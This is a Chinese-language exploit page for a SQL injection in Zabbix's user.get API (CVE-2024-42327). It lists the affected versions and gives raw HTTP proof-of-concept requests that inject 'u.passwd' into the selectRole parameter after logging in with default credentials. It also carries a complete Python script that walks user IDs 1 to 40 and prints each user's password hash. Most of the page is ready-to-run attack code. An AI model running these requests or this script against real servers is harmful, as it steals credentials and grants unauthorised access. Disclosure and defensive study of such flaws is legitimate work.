# Zabbix SQL注入漏洞(CVE-2024-42327)

Zabbix 是一款开源的网络监控和报警系统，用于监视网络设备、服务器和应用程序的性能和可用性。

Zabbix的addRelatedObjects函数中的CUser类中存在SQL注入，此函数由 CUser.get 函数调用，具有API访问权限的用户可利用造成越权访问高权限用户敏感信息以及执行恶意SQL语句等危害。

## 影响版本

```
6.0.0 <= Zabbix <= 6.0.31
6.4.0 <= Zabbix <= 6.4.16
Zabbix 7.0.0
```

## poc

```java
POST /api_jsonrpc.php HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json-rpc
Content-Length: 106

{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "Admin", "password": "zabbix"}, "id": 1}
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412040952671.webp)

```javascript
POST /api_jsonrpc.php HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json-rpc
Content-Length: 167

{"jsonrpc": "2.0", "method": "user.get", "params": {"selectRole": ["roleid, u.passwd", "roleid"], "userids": "1"}, "auth": "40b23536324a2e3e872f0f446d7a11d0", "id": 1}
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412040953059.webp)



## python

```python
import requests
import argparse

"""
Exploit Script for CVE-2024-42327
Author: Alejandro Ramos (@aramosf)
Assisted by: ChatGPT
Date: 2024-12-01

This script demonstrates the exploitation of the vulnerability CVE-2024-42327, 
registered by Zabbix as ZBX-25623. This vulnerability allows unauthorized 
access to sensitive user information by abusing the JSON-RPC API.

References:
- CVE: CVE-2024-42327
- Zabbix Issue Tracker: https://support.zabbix.com/browse/ZBX-25623

Functionality:
1. Logs in to the Zabbix JSON-RPC API to obtain a session token using a valid username and password.
2. Iterates over a range of user IDs (1 to 40), fetching user details for each ID.

Arguments:
- `-u` or `--url`: The API endpoint URL (e.g., http://192.168.201.128/api_jsonrpc.php).
- `-n` or `--username`: The username for authentication.
- `-p` or `--password`: The password for authentication.

Example:
python script.py -u "http://192.168.201.128/api_jsonrpc.php" -n "aramosf" -p "Hola1234"

Disclaimer:
This script is provided for educational purposes only. Unauthorized exploitation 
of vulnerabilities is illegal and unethical. Use responsibly.
"""

def main(url, username, password):
    # First request: Login to get the session token
    headers = {
        "Content-Type": "application/json-rpc"
    }
    login_data = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": username,
            "password": password
        },
        "id": 1
    }

    # Make the POST request for login
    response = requests.post(url, json=login_data, headers=headers)

    # Check if the login was successful
    if response.status_code == 200:
        login_result = response.json()
        auth_token = login_result.get("result")  # Extract the session token

        if auth_token:
            print(f"Valid session token: {auth_token}")

            # Loop over user IDs from 1 to 40
            for userid in range(1, 41):
                user_data = {
                    "jsonrpc": "2.0",
                    "method": "user.get",
                    "params": {
                        "selectRole": ["roleid, u.passwd", "roleid"],
                        "userids": str(userid)  # Convert the user ID to a string
                    },
                    "auth": auth_token,
                    "id": 1
                }

                # Make the POST request for each user ID
                user_response = requests.post(url, json=user_data, headers=headers)

                if user_response.status_code == 200:
                    user_result = user_response.json()

                    # Process the response to extract the desired fields
                    if "result" in user_result and user_result["result"]:
                        for user in user_result["result"]:
                            username = user.get("username", "N/A")
                            name = user.get("name", "N/A")
                            surname = user.get("surname", "N/A")
                            user_id = user.get("userid", "N/A")
                            role_passwd = user.get("role", {}).get("passwd", "N/A")

                            # Print only the requested fields, separated by commas
                            print(f"{username}, {name}, {surname}, {user_id}, {role_passwd}")
                else:
                    print(f"Error in the request for user ID {userid}: {user_response.status_code}")
                    print(user_response.text)
        else:
            print("Unable to retrieve a session token.")
    else:
        print(f"Error in login request: {response.status_code}")
        print(response.text)


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description=(
            "Exploit script for CVE-2024-42327 (Zabbix vulnerability ZBX-25623). "
            "Use to fetch user details from a Zabbix JSON-RPC API."
        )
    )
    parser.add_argument("-u", "--url", required=True, help="The API endpoint URL.")
    parser.add_argument("-n", "--username", required=True, help="The username for authentication.")
    parser.add_argument("-p", "--password", required=True, help="The password for authentication.")
    parser.add_argument(
        "--example", action="store_true", help="Show an example usage of the script."
    )

    args = parser.parse_args()

    # Display example usage if --example is passed
    if args.example:
        print(
            "Example:\n"
            "python script.py -u \"http://192.168.201.128/api_jsonrpc.php\" -n \"aramosf\" -p \"Hola1234\""
        )
    else:
        # Run the main function with the provided arguments
        main(args.url, args.username, args.password)

```



## 漏洞来源

- https://github.com/aramosf/cve-2024-42327
- https://mp.weixin.qq.com/s/H5KxVfdtAofcR1mC8IYqTw
- https://mp.weixin.qq.com/s/Bfo-aZrVsNmOMtoONBpLzg